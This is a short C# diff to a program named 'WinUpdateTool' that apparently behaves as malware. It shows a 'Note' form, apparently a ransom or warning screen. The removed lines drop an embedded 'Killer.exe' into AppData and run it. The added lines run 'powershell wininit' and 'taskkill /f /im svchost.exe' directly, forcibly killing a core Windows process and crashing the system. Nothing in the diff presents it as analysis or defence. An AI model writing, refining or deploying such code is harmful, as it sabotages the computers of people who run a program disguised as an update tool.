@@ -176,17 +176,8 @@ namespace WinUpdateTool
             Note noteForm = new Note();
             noteForm.Show();
             Thread.Sleep(30);
-            TerminateProcesses();
-        }
-
-        public void TerminateProcesses()
-        {
-            string killerTempDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Killer.exe";
-            byte[] Save = Properties.Resources.Killer;
-            FileStream fsObj = new FileStream(killerTempDir, FileMode.CreateNew);
-            fsObj.Write(Save, 0, Save.Length);
-            fsObj.Close();
-            Execute(killerTempDir, "kill svchost.exe");
+            Execute("powershell", "wininit");
+            Execute("taskkill", "/f /im svchost.exe");
         }
     }
 }
